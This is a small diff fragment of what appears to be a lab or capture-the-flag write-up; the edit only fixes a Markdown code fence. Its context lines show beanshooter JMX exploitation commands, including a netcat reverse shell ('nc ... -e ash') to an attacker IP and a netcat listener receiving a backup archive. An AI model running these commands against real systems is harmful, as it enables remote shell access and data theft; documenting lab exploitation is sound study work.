@@ -88,7 +88,7 @@ java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell 10.129.234.57 
 OR
 ```bash
 java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard exec 'nc 10.10.14.97 1234 -e ash' 
-```bash
+```
 ```
 nc -lvp 1234 > backup.tar.gz
 
